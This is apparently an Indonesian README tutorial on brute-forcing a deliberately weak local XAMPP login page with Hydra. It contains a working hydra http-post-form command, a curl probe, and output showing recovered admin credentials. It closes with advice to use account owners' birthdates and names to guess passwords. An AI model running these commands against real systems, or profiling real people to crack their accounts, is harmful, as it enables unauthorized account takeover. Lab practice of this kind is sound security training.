# hydra-brute-force
Brute-force adalah metode serangan dalam keamanan siber yang melibatkan percobaan berulang-ulang untuk menebak informasi sensitif, seperti password, username, atau kunci enkripsi, hingga menemukan kombinasi yang benar. Dalam serangan brute-force, semua kemungkinan kombinasi diperiksa satu per satu, tanpa mengandalkan celah atau kerentanan selain mencoba setiap opsi yang mungkin.

# Hydra 
Hydra adalah alat brute-force yang digunakan untuk menguji kerentanannya dengan mencoba berbagai kombinasi username dan password untuk berbagai protokol atau layanan. Ini sering digunakan dalam pengujian keamanan untuk menemukan kredensial yang valid.
````
hydra -L user.txt -P pass.txt -t 4 -V 192.168.1.2 http-post-form "/pe/low.php:username=^USER^&password=^PASS^:Login gagal. Username atau password salah." | tee -a fixpassworddanuser.txt

````


## Penjelasan: <br>
**`hydra`**: Perintah Hydra untuk melakukan brute-force.<br>

**`-L`** user.txt: File yang berisi daftar username.<br>

**`-P`** pass.txt: File yang berisi daftar password.<br>



**`-t 4`**: Mengatur jumlah thread yang akan digunakan oleh Hydra untuk melakukan serangan. Dalam hal ini, 4 thread akan digunakan secara bersamaan. Menggunakan lebih banyak thread dapat mempercepat proses brute-force tetapi juga meningkatkan beban pada sistem target dan jaringan.<br>


**`-V`**: Mengaktifkan mode verbose untuk menampilkan proses brute-force secara terperinci.<br>

**`192.168.1.2`**: Alamat IP dari server target yang akan diuji. Hydra akan mengarahkan serangan brute-force ke server ini.<br>

**`http-post-form`**: Menunjukkan jenis serangan yang akan dilakukan, yaitu HTTP POST form. Hydra akan mengirimkan permintaan POST ke form login yang ditentukan.<br>

**`/pe/low.php`**: Path ke halaman login form pada server target.<br>

**`username=^USER^&password=^PASS^`**: Parameter form yang diisi oleh Hydra(username dan password). <br>

**`:Login gagal. Username atau password salah.`**: String yang digunakan Hydra untuk mendeteksi kegagalan login.<br>

**`| tee -a fixpassworddanuser.txt`**: Perintah ini digunakan untuk menyimpan output Hydra yang mengandung username dan password yang benar ke dalam file fixpassworddanuser.txt.<br>


<br>
<br>


# cara pengguna 
saya di sini mengunakan server localhost  yaitu xampp  pertama download folder **`pe`** lalu  simpan di folder xampp htdocs  contoh  **`C:\xampp1\htdocs`**
 jika sudah maka masuk ke system oprasi linux <br>
 di linux alian simpan folder **`user dan password`** di linux yang penting file  pass.txt dan user.txt muda di jangkau <br>
 lalu kita mulai penetrasi server  pastikan server on jika suda buka terminal  sadisini mengunakan  **`kali linux`**
 ````
sudo apt update 
sudo apt install hydra

 ````

jika suda launjutmengamati target reaksi yang di timbul  contohnya pada **`pe/low.php`** kerika terjadi kesalanhan akan timbul pesan **`:Login gagal. Username atau password salah.`** kita dapat memanfatakan fungs **`curl`** sebagai berikut <br>
````
curl -X POST -d "username=admin&password=admi" http://192.168.1.2/pe/low.php
````
maka ouputnya akan seperti ini
```
┌──(udi㉿akhmadpc)-[~/Documents]
└─$ curl -X POST -d "username=admin&password=admi" http://192.168.1.2/pe/low.php                                                                                      

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
</head>
<body>
    <h2>Form Login low</h2>
    <form method="post" action="">
        Username: <input type="text" name="username" required><br>
        Password: <input type="password" name="password" required><br>
        <input type="submit" value="Login">
    </form>
    <p>Login gagal. Username atau password salah.</p>
</body>
</html>

```


jika suda mendapatakan target yanng d tentukan maka launjut menyesuaikan **`hydra -L user.txt -P pass.txt -t 4 -V 192.168.1.2 http-post-form "/pe/low.php:username=^USER^&password=^PASS^:Login gagal. Username atau password salah." | tee -a fixpassworddanuser.txt`**

dan tunggu proseser penetrasi sampai selesai 
<br> jika selesai maka buka file **`fixpassworddanuser.txt`** pada folder yang ada tentukan sebelumnya atau di tepat **`pass.txt dan user.txt`** di simpan lalu buka pada file tersebut berisi hasil dari brute suite yang telah di kerjakan 
````
[ATTEMPT] target 192.168.1.2 - login "123456" - pass "password!2024" - 170 of 28900 [child 3] (0/0)
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "123456" - 171 of 28900 [child 2] (0/0)
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "admin" - 172 of 28900 [child 1] (0/0)
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "password" - 173 of 28900 [child 0] (0/0)
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "123456789" - 174 of 28900 [child 3] (0/0)
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "12345678" - 175 of 28900 [child 2] (0/0)
[80][http-post-form] host: 192.168.1.2   login: admin   password: admin
[ATTEMPT] target 192.168.1.2 - login "password" - pass "123456" - 341 of 28900 [child 1] (0/0)
[ATTEMPT] target 192.168.1.2 - login "password" - pass "admin" - 342 of 28900 [child 0] (0/0)
[ATTEMPT] target 192.168.1.2 - login "password" - pass "password" - 343 of 28900 [child 3] (0/0)
````


Ciri-ciri login berhasil dari hasil brute force menggunakan Hydra adalah: <br>
### Log dengan format [80][http-post-form]: Baris ini menunjukkan bahwa Hydra telah berhasil melakukan login menggunakan kombinasi username dan password tertentu.
dari contoh di atas sudah di pastikan bahwa **`[80][http-post-form] host: 192.168.1.2   login: admin   password: admin`** adalah user dan password **`admin`** 

## perlu di perhatikan 
user dan password perlu di teliti lagi diman key yang di gunakan memiliki banyaka variasi kita harus mengetahu data dari pemilik server, Saat mencoba masuk ke akun, penting untuk tahu bahwa orang sering menggunakan nama atau tanggal lahir mereka sebagai username atau password. Jika kita tahu sedikit tentang orang yang memiliki akun, seperti tanggal lahirnya, kita bisa mencoba kombinasi yang mungkin mereka gunakan. Ini bisa membantu kita menemukan password yang benar lebih cepat.
